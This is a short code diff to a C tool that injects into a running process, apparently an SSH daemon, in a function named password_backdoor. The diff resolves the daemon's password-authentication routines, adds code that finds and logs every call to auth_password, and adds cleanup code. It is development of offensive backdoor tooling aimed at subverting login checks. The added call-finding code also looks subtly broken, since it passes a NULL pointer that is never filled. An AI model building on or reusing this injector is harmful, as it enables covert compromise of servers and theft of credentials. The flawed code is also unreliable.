@@ -160,6 +160,8 @@ void password_backdoor(inject_ctx *ctx) {
 
 	u64 use_privsep=0, logit_passchange=0, privsep_lea=0, privsep_test=0;
 	u64 auth_password=0, mm_auth_password=0;
+	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
+	int i, n_auth_password_calls, n_mm_auth_password_calls;
 
 	use_privsep = resolve_symbol_tab(ctx, "use_privsep");
 
@@ -193,6 +195,17 @@ void password_backdoor(inject_ctx *ctx) {
 
 	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
 	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
+	
+	n_auth_password_calls = find_calls(auth_password_calls, auth_password);
+	
+	if (n_auth_password_calls == 0)
+		error("No calls to auth_password found.");
+	
+	for (i = 0; i < n_auth_password_calls; i++) {
+		info("call to auth_password @ 0x%llx", auth_password_calls[i]);
+	}
+	
+	free(auth_password_calls);
 }
 
 int main(int argc, char *argv[]) {
@@ -273,5 +286,12 @@ int main(int argc, char *argv[]) {
 	_detach(ctx->pid);
 	info("detached.\n");
 	free(ctx);
+	
+	free_callcache();
+	free(dynsym);
+	free(dynstr);
+	free(symtab);
+	free(strtab);
+	//free(my_homies);
 	return 0;
 }
